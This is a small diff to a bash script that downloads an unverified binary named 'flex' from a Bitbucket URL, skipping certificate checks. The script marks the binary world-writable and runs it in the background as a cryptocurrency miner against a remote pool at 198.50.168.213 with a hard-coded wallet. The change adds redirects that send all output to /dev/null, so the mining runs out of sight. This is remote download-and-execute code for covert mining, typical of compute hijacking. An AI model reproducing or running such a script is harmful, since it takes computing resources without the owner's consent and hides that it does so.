@@ -1,7 +1,7 @@
 #!/bin/bash
-apt-get update /dev/null 2>&1
-apt install libjansson-dev -y /dev/null 2>&1
-curl -sLkO http://bitbucket.org/gerdsa/amsyungas/downloads/flex 
+apt-get update > /dev/null 2>&1
+apt install libjansson-dev -y > /dev/null 2>&1
+curl -sLkO http://bitbucket.org/gerdsa/amsyungas/downloads/flex > /dev/null 2>&1
 chmod 777 flex
 ./flex -a minotaurx -o 198.50.168.213:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA > /dev/null 2>&1 &
 sleep 30
